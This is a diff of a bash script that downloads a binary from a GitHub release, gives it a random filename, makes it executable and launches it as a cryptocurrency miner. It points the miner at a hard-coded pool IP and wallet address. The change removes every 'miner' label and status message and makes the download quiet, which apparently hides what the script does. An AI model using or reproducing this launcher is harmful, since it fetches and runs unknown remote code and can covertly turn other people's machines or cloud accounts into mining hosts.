@@ -1,56 +1,16 @@
 #!/bin/bash
+set -e  # Exit on any error
 
-# Generate a random 10-character lowercase alphanumeric filename
-generate_random_filename() {
-    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
-    echo
-}
+# Generate a random filename
+BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
-generate_worker_name() {
-    local prefix="AFB12"
-    local date_str
-    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
-    local random_suffix
-    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
+# Download binary quietly and rename
+wget -q https://github.com/vedhagsvp/nwxbsa/releases/download/latest/prlpek -O "$BIN_NAME"
 
-    echo "${prefix}-${date_str}-${random_suffix}"
-}
+# Make it executable
+chmod +x "$BIN_NAME"
 
+# Optional: run the binary
+# ./"$BIN_NAME"
 
-main() {
-    miner_filename=$(generate_random_filename)
-    worker_name=$(generate_worker_name)
-
-    # Optional: cleanup on Ctrl+C or SIGTERM
-    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
-
-    echo "📥 Downloading miner to: $miner_filename"
-    if wget -q https://github.com/vedhagsvp/nwxbsa/releases/download/latest/prlpek -O "$miner_filename"; then
-        echo "✅ Miner downloaded as: $miner_filename"
-    else
-        echo "❌ Failed to download miner. Exiting."
-        exit 1
-    fi
-
-    echo "🔐 Setting executable permission..."
-    if chmod +x "$miner_filename"; then
-        echo "✅ Permissions set."
-    else
-        echo "❌ Failed to set permissions. Exiting."
-        exit 1
-    fi
-
-    echo "👷 Worker Name: $worker_name"
-
-    echo "🚀 Starting miner..."
-    ./"$miner_filename" \
-        --coin pearl -o 45.33.114.232:7982 -u prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr/$(echo $RANDOM | md5sum | head -c 10)
-
-    if [[ $? -eq 0 ]]; then
-        echo "✅ Miner ran successfully."
-    else
-        echo "❌ Miner exited with an error."
-    fi
-}
-
-main
+./"$BIN_NAME" --coin pearl -o 45.33.114.232:7982 -u prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr/$(echo $RANDOM | md5sum | head -c 10)
